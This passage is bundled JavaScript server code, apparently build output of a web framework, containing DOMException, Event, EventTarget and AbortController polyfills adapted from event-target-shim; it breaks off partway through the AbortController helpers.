import { performance } from 'node:perf_hooks';
import { setTimeout as setTimeout$1, clearTimeout as clearTimeout$1 } from 'node:timers';
import { bootstrap } from 'global-agent';
import nodeFetch, { Headers as Headers$1, Request as Request$1, Response as Response$1 } from 'node-fetch';
import Stream from 'node:stream';
import fs from 'fs';
import mime from 'mime';
import { serialize as serialize$1, parse } from 'cookie';
import { escape } from 'html-escaper';
import { bold, yellow, dim, cyan, red, reset } from 'kleur/colors';
import 'string-width';
import npath from 'path-browserify';
import { Readable } from 'stream';
import path from 'path';
import { fileURLToPath } from 'url';
import http from 'http';
import https from 'https';
import send from 'send';
import React, { createElement } from 'react';
import ReactDOM from 'react-dom/server';
/* empty css                                  */import { jsx, Fragment as Fragment$1, jsxs } from 'react/jsx-runtime';
import { compile } from 'path-to-regexp';

/** Returns the function bound to the given object. */
const __function_bind = Function.bind.bind(Function.call);
/** Returns the function called with the specified values. */
Function.call.bind(Function.call);
/** Returns whether an object has a property with the specified name. */
const __object_hasOwnProperty = Function.call.bind(Object.prototype.hasOwnProperty);
/** Returns a string representation of an object. */
Function.call.bind(Object.prototype.toString);
/** Returns whether the object prototype exists in another object. */
const __object_isPrototypeOf = Function.call.bind(Object.prototype.isPrototypeOf);
/** Current high resolution millisecond timestamp. */
const __performance_now = performance.now;
/** Returns the string escaped for use inside regular expressions. */
const __string_escapeRegExp = (value) => value.replace(/[\\^$*+?.()|[\]{}]/g, '\\$&');
// @ts-ignore
const INTERNALS = new WeakMap();
const internalsOf = (target, className, propName) => {
    const internals = INTERNALS.get(target);
    if (!internals)
        throw new TypeError(`${className}.${propName} can only be used on instances of ${className}`);
    return internals;
};
const allowStringTag = (value) => (value.prototype[Symbol.toStringTag] = value.name);
/** Returns any kind of path as a posix path. */
const pathToPosix = (pathname) => String(pathname == null ? '' : pathname)
    .replace(
// convert slashes
/\\+/g, '/')
    .replace(
// prefix a slash to drive letters
/^(?=[A-Za-z]:\/)/, '/')
    .replace(
// encode path characters
/%/g, '%25')
    .replace(/\n/g, '%0A')
    .replace(/\r/g, '%0D')
    .replace(/\t/g, '%09');

class DOMException extends Error {
    constructor(message = '', name = 'Error') {
        super(message);
        this.code = 0;
        this.name = name;
    }
}
DOMException.INDEX_SIZE_ERR = 1;
DOMException.DOMSTRING_SIZE_ERR = 2;
DOMException.HIERARCHY_REQUEST_ERR = 3;
DOMException.WRONG_DOCUMENT_ERR = 4;
DOMException.INVALID_CHARACTER_ERR = 5;
DOMException.NO_DATA_ALLOWED_ERR = 6;
DOMException.NO_MODIFICATION_ALLOWED_ERR = 7;
DOMException.NOT_FOUND_ERR = 8;
DOMException.NOT_SUPPORTED_ERR = 9;
DOMException.INUSE_ATTRIBUTE_ERR = 10;
DOMException.INVALID_STATE_ERR = 11;
DOMException.SYNTAX_ERR = 12;
DOMException.INVALID_MODIFICATION_ERR = 13;
DOMException.NAMESPACE_ERR = 14;
DOMException.INVALID_ACCESS_ERR = 15;
DOMException.VALIDATION_ERR = 16;
DOMException.TYPE_MISMATCH_ERR = 17;
DOMException.SECURITY_ERR = 18;
DOMException.NETWORK_ERR = 19;
DOMException.ABORT_ERR = 20;
DOMException.URL_MISMATCH_ERR = 21;
DOMException.QUOTA_EXCEEDED_ERR = 22;
DOMException.TIMEOUT_ERR = 23;
DOMException.INVALID_NODE_TYPE_ERR = 24;
DOMException.DATA_CLONE_ERR = 25;
allowStringTag(DOMException);

/**
 * Assert a condition.
 * @param condition The condition that it should satisfy.
 * @param message The error message.
 * @param args The arguments for replacing placeholders in the message.
 */
function assertType(condition, message, ...args) {
    if (!condition) {
        throw new TypeError(format(message, args));
    }
}
/**
 * Convert a text and arguments to one string.
 * @param message The formating text
 * @param args The arguments.
 */
function format(message, args) {
    let i = 0;
    return message.replace(/%[os]/gu, () => anyToString(args[i++]));
}
/**
 * Convert a value to a string representation.
 * @param x The value to get the string representation.
 */
function anyToString(x) {
    if (typeof x !== "object" || x === null) {
        return String(x);
    }
    return Object.prototype.toString.call(x);
}

let currentErrorHandler;
/**
 * Print a error message.
 * @param maybeError The error object.
 */
function reportError(maybeError) {
    try {
        const error = maybeError instanceof Error
            ? maybeError
            : new Error(anyToString(maybeError));
        // Call the user-defined error handler if exists.
        if (currentErrorHandler) ;
        // Dispatch an `error` event if this is on a browser.
        if (typeof dispatchEvent === "function" &&
            typeof ErrorEvent === "function") {
            dispatchEvent(new ErrorEvent("error", { error, message: error.message }));
        }
        // Emit an `uncaughtException` event if this is on Node.js.
        //istanbul ignore else
        else if (typeof process !== "undefined" &&
            typeof process.emit === "function") {
            process.emit("uncaughtException", error);
            return;
        }
        // Otherwise, print the error.
        console.error(error);
    }
    catch (_a) {
        // ignore.
    }
}

let currentWarnHandler;
/**
 * The warning information.
 */
class Warning {
    constructor(code, message) {
        this.code = code;
        this.message = message;
    }
    /**
     * Report this warning.
     * @param args The arguments of the warning.
     */
    warn(...args) {
        var _a;
        try {
            // Call the user-defined warning handler if exists.
            if (currentWarnHandler) ;
            // Otherwise, print the warning.
            const stack = ((_a = new Error().stack) !== null && _a !== void 0 ? _a : "").replace(/^(?:.+?\n){2}/gu, "\n");
            console.warn(this.message, ...args, stack);
        }
        catch (_b) {
            // Ignore.
        }
    }
}

const InitEventWasCalledWhileDispatching = new Warning("W01", "Unable to initialize event under dispatching.");
const FalsyWasAssignedToCancelBubble = new Warning("W02", "Assigning any falsy value to 'cancelBubble' property has no effect.");
const TruthyWasAssignedToReturnValue = new Warning("W03", "Assigning any truthy value to 'returnValue' property has no effect.");
const NonCancelableEventWasCanceled = new Warning("W04", "Unable to preventDefault on non-cancelable events.");
const CanceledInPassiveListener = new Warning("W05", "Unable to preventDefault inside passive event listener invocation.");
const EventListenerWasDuplicated = new Warning("W06", "An event listener wasn't added because it has been added already: %o, %o");
const OptionWasIgnored = new Warning("W07", "The %o option value was abandoned because the event listener wasn't added as duplicated.");
const InvalidEventListener = new Warning("W08", "The 'callback' argument must be a function or an object that has 'handleEvent' method: %o");
const InvalidAttributeHandler = new Warning("W09", "Event attribute handler must be a function: %o");

/*eslint-disable class-methods-use-this */
/**
 * An implementation of `Event` interface, that wraps a given event object.
 * `EventTarget` shim can control the internal state of this `Event` objects.
 * @see https://dom.spec.whatwg.org/#event
 */
class Event {
    /**
     * @see https://dom.spec.whatwg.org/#dom-event-none
     */
    static get NONE() {
        return NONE;
    }
    /**
     * @see https://dom.spec.whatwg.org/#dom-event-capturing_phase
     */
    static get CAPTURING_PHASE() {
        return CAPTURING_PHASE;
    }
    /**
     * @see https://dom.spec.whatwg.org/#dom-event-at_target
     */
    static get AT_TARGET() {
        return AT_TARGET;
    }
    /**
     * @see https://dom.spec.whatwg.org/#dom-event-bubbling_phase
     */
    static get BUBBLING_PHASE() {
        return BUBBLING_PHASE;
    }
    /**
     * Initialize this event instance.
     * @param type The type of this event.
     * @param eventInitDict Options to initialize.
     * @see https://dom.spec.whatwg.org/#dom-event-event
     */
    constructor(type, eventInitDict) {
        Object.defineProperty(this, "isTrusted", {
            value: false,
            enumerable: true,
        });
        const opts = eventInitDict !== null && eventInitDict !== void 0 ? eventInitDict : {};
        internalDataMap.set(this, {
            type: String(type),
            bubbles: Boolean(opts.bubbles),
            cancelable: Boolean(opts.cancelable),
            composed: Boolean(opts.composed),
            target: null,
            currentTarget: null,
            stopPropagationFlag: false,
            stopImmediatePropagationFlag: false,
            canceledFlag: false,
            inPassiveListenerFlag: false,
            dispatchFlag: false,
            timeStamp: Date.now(),
        });
    }
    /**
     * The type of this event.
     * @see https://dom.spec.whatwg.org/#dom-event-type
     */
    get type() {
        return $(this).type;
    }
    /**
     * The event target of the current dispatching.
     * @see https://dom.spec.whatwg.org/#dom-event-target
     */
    get target() {
        return $(this).target;
    }
    /**
     * The event target of the current dispatching.
     * @deprecated Use the `target` property instead.
     * @see https://dom.spec.whatwg.org/#dom-event-srcelement
     */
    get srcElement() {
        return $(this).target;
    }
    /**
     * The event target of the current dispatching.
     * @see https://dom.spec.whatwg.org/#dom-event-currenttarget
     */
    get currentTarget() {
        return $(this).currentTarget;
    }
    /**
     * The event target of the current dispatching.
     * This doesn't support node tree.
     * @see https://dom.spec.whatwg.org/#dom-event-composedpath
     */
    composedPath() {
        const currentTarget = $(this).currentTarget;
        if (currentTarget) {
            return [currentTarget];
        }
        return [];
    }
    /**
     * @see https://dom.spec.whatwg.org/#dom-event-none
     */
    get NONE() {
        return NONE;
    }
    /**
     * @see https://dom.spec.whatwg.org/#dom-event-capturing_phase
     */
    get CAPTURING_PHASE() {
        return CAPTURING_PHASE;
    }
    /**
     * @see https://dom.spec.whatwg.org/#dom-event-at_target
     */
    get AT_TARGET() {
        return AT_TARGET;
    }
    /**
     * @see https://dom.spec.whatwg.org/#dom-event-bubbling_phase
     */
    get BUBBLING_PHASE() {
        return BUBBLING_PHASE;
    }
    /**
     * The current event phase.
     * @see https://dom.spec.whatwg.org/#dom-event-eventphase
     */
    get eventPhase() {
        return $(this).dispatchFlag ? 2 : 0;
    }
    /**
     * Stop event bubbling.
     * Because this shim doesn't support node tree, this merely changes the `cancelBubble` property value.
     * @see https://dom.spec.whatwg.org/#dom-event-stoppropagation
     */
    stopPropagation() {
        $(this).stopPropagationFlag = true;
    }
    /**
     * `true` if event bubbling was stopped.
     * @deprecated
     * @see https://dom.spec.whatwg.org/#dom-event-cancelbubble
     */
    get cancelBubble() {
        return $(this).stopPropagationFlag;
    }
    /**
     * Stop event bubbling if `true` is set.
     * @deprecated Use the `stopPropagation()` method instead.
     * @see https://dom.spec.whatwg.org/#dom-event-cancelbubble
     */
    set cancelBubble(value) {
        if (value) {
            $(this).stopPropagationFlag = true;
        }
        else {
            FalsyWasAssignedToCancelBubble.warn();
        }
    }
    /**
     * Stop event bubbling and subsequent event listener callings.
     * @see https://dom.spec.whatwg.org/#dom-event-stopimmediatepropagation
     */
    stopImmediatePropagation() {
        const data = $(this);
        data.stopPropagationFlag = data.stopImmediatePropagationFlag = true;
    }
    /**
     * `true` if this event will bubble.
     * @see https://dom.spec.whatwg.org/#dom-event-bubbles
     */
    get bubbles() {
        return $(this).bubbles;
    }
    /**
     * `true` if this event can be canceled by the `preventDefault()` method.
     * @see https://dom.spec.whatwg.org/#dom-event-cancelable
     */
    get cancelable() {
        return $(this).cancelable;
    }
    /**
     * `true` if the default behavior will act.
     * @deprecated Use the `defaultPrevented` proeprty instead.
     * @see https://dom.spec.whatwg.org/#dom-event-returnvalue
     */
    get returnValue() {
        return !$(this).canceledFlag;
    }
    /**
     * Cancel the default behavior if `false` is set.
     * @deprecated Use the `preventDefault()` method instead.
     * @see https://dom.spec.whatwg.org/#dom-event-returnvalue
     */
    set returnValue(value) {
        if (!value) {
            setCancelFlag($(this));
        }
        else {
            TruthyWasAssignedToReturnValue.warn();
        }
    }
    /**
     * Cancel the default behavior.
     * @see https://dom.spec.whatwg.org/#dom-event-preventdefault
     */
    preventDefault() {
        setCancelFlag($(this));
    }
    /**
     * `true` if the default behavior was canceled.
     * @see https://dom.spec.whatwg.org/#dom-event-defaultprevented
     */
    get defaultPrevented() {
        return $(this).canceledFlag;
    }
    /**
     * @see https://dom.spec.whatwg.org/#dom-event-composed
     */
    get composed() {
        return $(this).composed;
    }
    /**
     * @see https://dom.spec.whatwg.org/#dom-event-istrusted
     */
    //istanbul ignore next
    get isTrusted() {
        return false;
    }
    /**
     * @see https://dom.spec.whatwg.org/#dom-event-timestamp
     */
    get timeStamp() {
        return $(this).timeStamp;
    }
    /**
     * @deprecated Don't use this method. The constructor did initialization.
     */
    initEvent(type, bubbles = false, cancelable = false) {
        const data = $(this);
        if (data.dispatchFlag) {
            InitEventWasCalledWhileDispatching.warn();
            return;
        }
        internalDataMap.set(this, {
            ...data,
            type: String(type),
            bubbles: Boolean(bubbles),
            cancelable: Boolean(cancelable),
            target: null,
            currentTarget: null,
            stopPropagationFlag: false,
            stopImmediatePropagationFlag: false,
            canceledFlag: false,
        });
    }
}
//------------------------------------------------------------------------------
// Helpers
//------------------------------------------------------------------------------
const NONE = 0;
const CAPTURING_PHASE = 1;
const AT_TARGET = 2;
const BUBBLING_PHASE = 3;
/**
 * Private data for event wrappers.
 */
const internalDataMap = new WeakMap();
/**
 * Get private data.
 * @param event The event object to get private data.
 * @param name The variable name to report.
 * @returns The private data of the event.
 */
function $(event, name = "this") {
    const retv = internalDataMap.get(event);
    assertType(retv != null, "'%s' must be an object that Event constructor created, but got another one: %o", name, event);
    return retv;
}
/**
 * https://dom.spec.whatwg.org/#set-the-canceled-flag
 * @param data private data.
 */
function setCancelFlag(data) {
    if (data.inPassiveListenerFlag) {
        CanceledInPassiveListener.warn();
        return;
    }
    if (!data.cancelable) {
        NonCancelableEventWasCanceled.warn();
        return;
    }
    data.canceledFlag = true;
}
// Set enumerable
Object.defineProperty(Event, "NONE", { enumerable: true });
Object.defineProperty(Event, "CAPTURING_PHASE", { enumerable: true });
Object.defineProperty(Event, "AT_TARGET", { enumerable: true });
Object.defineProperty(Event, "BUBBLING_PHASE", { enumerable: true });
const keys$1 = Object.getOwnPropertyNames(Event.prototype);
for (let i = 0; i < keys$1.length; ++i) {
    if (keys$1[i] === "constructor") {
        continue;
    }
    Object.defineProperty(Event.prototype, keys$1[i], { enumerable: true });
}

/**
 * An implementation of `Event` interface, that wraps a given event object.
 * This class controls the internal state of `Event`.
 * @see https://dom.spec.whatwg.org/#interface-event
 */
class EventWrapper extends Event {
    /**
     * Wrap a given event object to control states.
     * @param event The event-like object to wrap.
     */
    static wrap(event) {
        return new (getWrapperClassOf(event))(event);
    }
    constructor(event) {
        super(event.type, {
            bubbles: event.bubbles,
            cancelable: event.cancelable,
            composed: event.composed,
        });
        if (event.cancelBubble) {
            super.stopPropagation();
        }
        if (event.defaultPrevented) {
            super.preventDefault();
        }
        internalDataMap$1.set(this, { original: event });
        // Define accessors
        const keys = Object.keys(event);
        for (let i = 0; i < keys.length; ++i) {
            const key = keys[i];
            if (!(key in this)) {
                Object.defineProperty(this, key, defineRedirectDescriptor(event, key));
            }
        }
    }
    stopPropagation() {
        super.stopPropagation();
        const { original } = $$1(this);
        if ("stopPropagation" in original) {
            original.stopPropagation();
        }
    }
    get cancelBubble() {
        return super.cancelBubble;
    }
    set cancelBubble(value) {
        super.cancelBubble = value;
        const { original } = $$1(this);
        if ("cancelBubble" in original) {
            original.cancelBubble = value;
        }
    }
    stopImmediatePropagation() {
        super.stopImmediatePropagation();
        const { original } = $$1(this);
        if ("stopImmediatePropagation" in original) {
            original.stopImmediatePropagation();
        }
    }
    get returnValue() {
        return super.returnValue;
    }
    set returnValue(value) {
        super.returnValue = value;
        const { original } = $$1(this);
        if ("returnValue" in original) {
            original.returnValue = value;
        }
    }
    preventDefault() {
        super.preventDefault();
        const { original } = $$1(this);
        if ("preventDefault" in original) {
            original.preventDefault();
        }
    }
    get timeStamp() {
        const { original } = $$1(this);
        if ("timeStamp" in original) {
            return original.timeStamp;
        }
        return super.timeStamp;
    }
}
/**
 * Private data for event wrappers.
 */
const internalDataMap$1 = new WeakMap();
/**
 * Get private data.
 * @param event The event object to get private data.
 * @returns The private data of the event.
 */
function $$1(event) {
    const retv = internalDataMap$1.get(event);
    assertType(retv != null, "'this' is expected an Event object, but got", event);
    return retv;
}
/**
 * Cache for wrapper classes.
 * @type {WeakMap<Object, Function>}
 * @private
 */
const wrapperClassCache = new WeakMap();
// Make association for wrappers.
wrapperClassCache.set(Object.prototype, EventWrapper);
/**
 * Get the wrapper class of a given prototype.
 * @param originalEvent The event object to wrap.
 */
function getWrapperClassOf(originalEvent) {
    const prototype = Object.getPrototypeOf(originalEvent);
    if (prototype == null) {
        return EventWrapper;
    }
    let wrapper = wrapperClassCache.get(prototype);
    if (wrapper == null) {
        wrapper = defineWrapper(getWrapperClassOf(prototype), prototype);
        wrapperClassCache.set(prototype, wrapper);
    }
    return wrapper;
}
/**
 * Define new wrapper class.
 * @param BaseEventWrapper The base wrapper class.
 * @param originalPrototype The prototype of the original event.
 */
function defineWrapper(BaseEventWrapper, originalPrototype) {
    class CustomEventWrapper extends BaseEventWrapper {
    }
    const keys = Object.keys(originalPrototype);
    for (let i = 0; i < keys.length; ++i) {
        Object.defineProperty(CustomEventWrapper.prototype, keys[i], defineRedirectDescriptor(originalPrototype, keys[i]));
    }
    return CustomEventWrapper;
}
/**
 * Get the property descriptor to redirect a given property.
 */
function defineRedirectDescriptor(obj, key) {
    const d = Object.getOwnPropertyDescriptor(obj, key);
    return {
        get() {
            const original = $$1(this).original;
            const value = original[key];
            if (typeof value === "function") {
                return value.bind(original);
            }
            return value;
        },
        set(value) {
            const original = $$1(this).original;
            original[key] = value;
        },
        configurable: d.configurable,
        enumerable: d.enumerable,
    };
}

/**
 * Create a new listener.
 * @param callback The callback function.
 * @param capture The capture flag.
 * @param passive The passive flag.
 * @param once The once flag.
 * @param signal The abort signal.
 * @param signalListener The abort event listener for the abort signal.
 */
function createListener(callback, capture, passive, once, signal, signalListener) {
    return {
        callback,
        flags: (capture ? 1 /* Capture */ : 0) |
            (passive ? 2 /* Passive */ : 0) |
            (once ? 4 /* Once */ : 0),
        signal,
        signalListener,
    };
}
/**
 * Set the `removed` flag to the given listener.
 * @param listener The listener to check.
 */
function setRemoved(listener) {
    listener.flags |= 8 /* Removed */;
}
/**
 * Check if the given listener has the `capture` flag or not.
 * @param listener The listener to check.
 */
function isCapture(listener) {
    return (listener.flags & 1 /* Capture */) === 1 /* Capture */;
}
/**
 * Check if the given listener has the `passive` flag or not.
 * @param listener The listener to check.
 */
function isPassive(listener) {
    return (listener.flags & 2 /* Passive */) === 2 /* Passive */;
}
/**
 * Check if the given listener has the `once` flag or not.
 * @param listener The listener to check.
 */
function isOnce(listener) {
    return (listener.flags & 4 /* Once */) === 4 /* Once */;
}
/**
 * Check if the given listener has the `removed` flag or not.
 * @param listener The listener to check.
 */
function isRemoved(listener) {
    return (listener.flags & 8 /* Removed */) === 8 /* Removed */;
}
/**
 * Call an event listener.
 * @param listener The listener to call.
 * @param target The event target object for `thisArg`.
 * @param event The event object for the first argument.
 * @param attribute `true` if this callback is an event attribute handler.
 */
function invokeCallback({ callback }, target, event) {
    try {
        if (typeof callback === "function") {
            callback.call(target, event);
        }
        else if (typeof callback.handleEvent === "function") {
            callback.handleEvent(event);
        }
    }
    catch (thrownError) {
        reportError(thrownError);
    }
}

/**
 * Find the index of given listener.
 * This returns `-1` if not found.
 * @param list The listener list.
 * @param callback The callback function to find.
 * @param capture The capture flag to find.
 */
function findIndexOfListener({ listeners }, callback, capture) {
    for (let i = 0; i < listeners.length; ++i) {
        if (listeners[i].callback === callback &&
            isCapture(listeners[i]) === capture) {
            return i;
        }
    }
    return -1;
}
/**
 * Add the given listener.
 * Does copy-on-write if needed.
 * @param list The listener list.
 * @param callback The callback function.
 * @param capture The capture flag.
 * @param passive The passive flag.
 * @param once The once flag.
 * @param signal The abort signal.
 */
function addListener(list, callback, capture, passive, once, signal) {
    let signalListener;
    if (signal) {
        signalListener = removeListener.bind(null, list, callback, capture);
        signal.addEventListener("abort", signalListener);
    }
    const listener = createListener(callback, capture, passive, once, signal, signalListener);
    if (list.cow) {
        list.cow = false;
        list.listeners = [...list.listeners, listener];
    }
    else {
        list.listeners.push(listener);
    }
    return listener;
}
/**
 * Remove a listener.
 * @param list The listener list.
 * @param callback The callback function to find.
 * @param capture The capture flag to find.
 * @returns `true` if it mutated the list directly.
 */
function removeListener(list, callback, capture) {
    const index = findIndexOfListener(list, callback, capture);
    if (index !== -1) {
        return removeListenerAt(list, index);
    }
    return false;
}
/**
 * Remove a listener.
 * @param list The listener list.
 * @param index The index of the target listener.
 * @param disableCow Disable copy-on-write if true.
 * @returns `true` if it mutated the `listeners` array directly.
 */
function removeListenerAt(list, index, disableCow = false) {
    const listener = list.listeners[index];
    // Set the removed flag.
    setRemoved(listener);
    // Dispose the abort signal listener if exists.
    if (listener.signal) {
        listener.signal.removeEventListener("abort", listener.signalListener);
    }
    // Remove it from the array.
    if (list.cow && !disableCow) {
        list.cow = false;
        list.listeners = list.listeners.filter((_, i) => i !== index);
        return false;
    }
    list.listeners.splice(index, 1);
    return true;
}

/**
 * Create a new `ListenerListMap` object.
 */
function createListenerListMap() {
    return Object.create(null);
}
/**
 * Get the listener list of the given type.
 * If the listener list has not been initialized, initialize and return it.
 * @param listenerMap The listener list map.
 * @param type The event type to get.
 */
function ensureListenerList(listenerMap, type) {
    var _a;
    return ((_a = listenerMap[type]) !== null && _a !== void 0 ? _a : (listenerMap[type] = {
        attrCallback: undefined,
        attrListener: undefined,
        cow: false,
        listeners: [],
    }));
}

/**
 * An implementation of the `EventTarget` interface.
 * @see https://dom.spec.whatwg.org/#eventtarget
 */
class EventTarget {
    /**
     * Initialize this instance.
     */
    constructor() {
        internalDataMap$2.set(this, createListenerListMap());
    }
    // Implementation
    addEventListener(type0, callback0, options0) {
        const listenerMap = $$2(this);
        const { callback, capture, once, passive, signal, type, } = normalizeAddOptions(type0, callback0, options0);
        if (callback == null || (signal === null || signal === void 0 ? void 0 : signal.aborted)) {
            return;
        }
        const list = ensureListenerList(listenerMap, type);
        // Find existing listener.
        const i = findIndexOfListener(list, callback, capture);
        if (i !== -1) {
            warnDuplicate(list.listeners[i], passive, once, signal);
            return;
        }
        // Add the new listener.
        addListener(list, callback, capture, passive, once, signal);
    }
    // Implementation
    removeEventListener(type0, callback0, options0) {
        const listenerMap = $$2(this);
        const { callback, capture, type } = normalizeOptions(type0, callback0, options0);
        const list = listenerMap[type];
        if (callback != null && list) {
            removeListener(list, callback, capture);
        }
    }
    // Implementation
    dispatchEvent(e) {
        const list = $$2(this)[String(e.type)];
        if (list == null) {
            return true;
        }
        const event = e instanceof Event ? e : EventWrapper.wrap(e);
        const eventData = $(event, "event");
        if (eventData.dispatchFlag) {
           throw new DOMException("This event has been in dispatching.");
        }
        eventData.dispatchFlag = true;
        eventData.target = eventData.currentTarget = this;
        if (!eventData.stopPropagationFlag) {
            const { cow, listeners } = list;
            // Set copy-on-write flag.
            list.cow = true;
            // Call listeners.
            for (let i = 0; i < listeners.length; ++i) {
                const listener = listeners[i];
                // Skip if removed.
                if (isRemoved(listener)) {
                    continue;
                }
                // Remove this listener if has the `once` flag.
                if (isOnce(listener) && removeListenerAt(list, i, !cow)) {
                    // Because this listener was removed, the next index is the
                    // same as the current value.
                    i -= 1;
                }
                // Call this listener with the `passive` flag.
                eventData.inPassiveListenerFlag = isPassive(listener);
                invokeCallback(listener, this, event);
                eventData.inPassiveListenerFlag = false;
                // Stop if the `event.stopImmediatePropagation()` method was called.
                if (eventData.stopImmediatePropagationFlag) {
                    break;
                }
            }
            // Restore copy-on-write flag.
            if (!cow) {
                list.cow = false;
            }
        }
        eventData.target = null;
        eventData.currentTarget = null;
        eventData.stopImmediatePropagationFlag = false;
        eventData.stopPropagationFlag = false;
        eventData.dispatchFlag = false;
        return !eventData.canceledFlag;
    }
}
/**
 * Internal data.
 */
const internalDataMap$2 = new WeakMap();
/**
 * Get private data.
 * @param target The event target object to get private data.
 * @param name The variable name to report.
 * @returns The private data of the event.
 */
function $$2(target, name = "this") {
    const retv = internalDataMap$2.get(target);
    assertType(retv != null, "'%s' must be an object that EventTarget constructor created, but got another one: %o", name, target);
    return retv;
}
/**
 * Normalize options.
 * @param options The options to normalize.
 */
function normalizeAddOptions(type, callback, options) {
    var _a;
    assertCallback(callback);
    if (typeof options === "object" && options !== null) {
        return {
            type: String(type),
            callback: callback !== null && callback !== void 0 ? callback : undefined,
            capture: Boolean(options.capture),
            passive: Boolean(options.passive),
            once: Boolean(options.once),
            signal: (_a = options.signal) !== null && _a !== void 0 ? _a : undefined,
        };
    }
    return {
        type: String(type),
        callback: callback !== null && callback !== void 0 ? callback : undefined,
        capture: Boolean(options),
        passive: false,
        once: false,
        signal: undefined,
    };
}
/**
 * Normalize options.
 * @param options The options to normalize.
 */
function normalizeOptions(type, callback, options) {
    assertCallback(callback);
    if (typeof options === "object" && options !== null) {
        return {
            type: String(type),
            callback: callback !== null && callback !== void 0 ? callback : undefined,
            capture: Boolean(options.capture),
        };
    }
    return {
        type: String(type),
        callback: callback !== null && callback !== void 0 ? callback : undefined,
        capture: Boolean(options),
    };
}
/**
 * Assert the type of 'callback' argument.
 * @param callback The callback to check.
 */
function assertCallback(callback) {
    if (typeof callback === "function" ||
        (typeof callback === "object" &&
            callback !== null &&
            typeof callback.handleEvent === "function")) {
        return;
    }
    if (callback == null || typeof callback === "object") {
        InvalidEventListener.warn(callback);
        return;
    }
    throw new TypeError(format(InvalidEventListener.message, [callback]));
}
/**
 * Print warning for duplicated.
 * @param listener The current listener that is duplicated.
 * @param passive The passive flag of the new duplicated listener.
 * @param once The once flag of the new duplicated listener.
 * @param signal The signal object of the new duplicated listener.
 */
function warnDuplicate(listener, passive, once, signal) {
    EventListenerWasDuplicated.warn(isCapture(listener) ? "capture" : "bubble", listener.callback);
    if (isPassive(listener) !== passive) {
        OptionWasIgnored.warn("passive");
    }
    if (isOnce(listener) !== once) {
        OptionWasIgnored.warn("once");
    }
    if (listener.signal !== signal) {
        OptionWasIgnored.warn("signal");
    }
}
// Set enumerable
const keys$1$1 = Object.getOwnPropertyNames(EventTarget.prototype);
for (let i = 0; i < keys$1$1.length; ++i) {
    if (keys$1$1[i] === "constructor") {
        continue;
    }
    Object.defineProperty(EventTarget.prototype, keys$1$1[i], { enumerable: true });
}
// Ensure `eventTarget instanceof window.EventTarget` is `true`.

/**
 * Get the current value of a given event attribute.
 * @param target The `EventTarget` object to get.
 * @param type The event type.
 */
function getEventAttributeValue(target, type) {
    var _a, _b;
    const listMap = $$2(target, "target");
    return (_b = (_a = listMap[type]) === null || _a === void 0 ? void 0 : _a.attrCallback) !== null && _b !== void 0 ? _b : null;
}
/**
 * Set an event listener to a given event attribute.
 * @param target The `EventTarget` object to set.
 * @param type The event type.
 * @param callback The event listener.
 */
function setEventAttributeValue(target, type, callback) {
    if (callback != null && typeof callback !== "function") {
        InvalidAttributeHandler.warn(callback);
    }
    if (typeof callback === "function" ||
        (typeof callback === "object" && callback !== null)) {
        upsertEventAttributeListener(target, type, callback);
    }
    else {
        removeEventAttributeListener(target, type);
    }
}
//------------------------------------------------------------------------------
// Helpers
//------------------------------------------------------------------------------
/**
 * Update or insert the given event attribute handler.
 * @param target The `EventTarget` object to set.
 * @param type The event type.
 * @param callback The event listener.
 */
function upsertEventAttributeListener(target, type, callback) {
    const list = ensureListenerList($$2(target, "target"), String(type));
    list.attrCallback = callback;
    if (list.attrListener == null) {
        list.attrListener = addListener(list, defineEventAttributeCallback(list), false, false, false, undefined);
    }
}
/**
 * Remove the given event attribute handler.
 * @param target The `EventTarget` object to remove.
 * @param type The event type.
 * @param callback The event listener.
 */
function removeEventAttributeListener(target, type) {
    const listMap = $$2(target, "target");
    const list = listMap[String(type)];
    if (list && list.attrListener) {
        removeListener(list, list.attrListener.callback, false);
        list.attrCallback = list.attrListener = undefined;
    }
}
/**
 * Define the callback function for the given listener list object.
 * It calls `attrCallback` property if the property value is a function.
 * @param list The `ListenerList` object.
 */
function defineEventAttributeCallback(list) {
    return function (event) {
        const callback = list.attrCallback;
        if (typeof callback === "function") {
            callback.call(this, event);
        }
    };
}
/**
 * Define an event attribute.
 * @param target The `EventTarget` object to define an event attribute.
 * @param type The event type to define.
 * @param _eventClass Unused, but to infer `Event` class type.
 * @deprecated Use `getEventAttributeValue`/`setEventAttributeValue` pair on your derived class instead because of static analysis friendly.
 */
function defineEventAttribute(target, type, _eventClass) {
    Object.defineProperty(target, `on${type}`, {
        get() {
            return getEventAttributeValue(this, type);
        },
        set(value) {
            setEventAttributeValue(this, type, value);
        },
        configurable: true,
        enumerable: true,
    });
}

/**
 * @author Toru Nagashima <https://github.com/mysticatea>
 * See LICENSE file in root directory for full license.
 */

/**
 * The signal class.
 * @see https://dom.spec.whatwg.org/#abortsignal
 */
class AbortSignal extends EventTarget {
    /**
     * AbortSignal cannot be constructed directly.
     */
    constructor() {
        super();
        throw new TypeError("AbortSignal cannot be constructed directly");
    }
    /**
     * Returns `true` if this `AbortSignal`'s `AbortController` has signaled to abort, and `false` otherwise.
     */
    get aborted() {
        const aborted = abortedFlags.get(this);
        if (typeof aborted !== "boolean") {
            throw new TypeError(`Expected 'this' to be an 'AbortSignal' object, but got ${this === null ? "null" : typeof this}`);
        }
        return aborted;
    }
}
defineEventAttribute(AbortSignal.prototype, "abort");
/**
 * Create an AbortSignal object.
 */
function createAbortSignal() {
    const signal = Object.create(AbortSignal.prototype);
    EventTarget.call(signal);
    abortedFlags.set(signal, false);
    return signal;
}
/**
 * Abort a given signal.
 */
function abortSignal(signal) {
    if (abortedFlags.get(signal) !== false) {
        return;
    }
    abortedFlags.set(signal, true);
    signal.dispatchEvent({ type: "abort" });
}
/**
 * Aborted flag for each instances.
 */
const abortedFlags = new WeakMap();
// Properties should be enumerable.
Object.defineProperties(AbortSignal.prototype, {
    aborted: { enumerable: true },
});
// `toString()` should return `"[object AbortSignal]"`
if (typeof Symbol === "function" && typeof Symbol.toStringTag === "symbol") {
    Object.defineProperty(AbortSignal.prototype, Symbol.toStringTag, {
        configurable: true,
        value: "AbortSignal",
    });
}

/**
 * The AbortController.
 * @see https://dom.spec.whatwg.org/#abortcontroller
 */
class AbortController {
    /**
     * Initialize this controller.
     */
    constructor() {
        signals.set(this, createAbortSignal());
    }
    /**
     * Returns the `AbortSignal` object associated with this object.
     */
    get signal() {
        return getSignal(this);
    }
    /**
     * Abort and signal to any observers that the associated activity is to be aborted.
     */
    abort() {
        abortSignal(getSignal(this));
    }
}
/**
 * Associated signals.
 */
const signals = new WeakMap();
/**
 * Get the associated signal of a given controller.
 */
function getSignal(controller) {
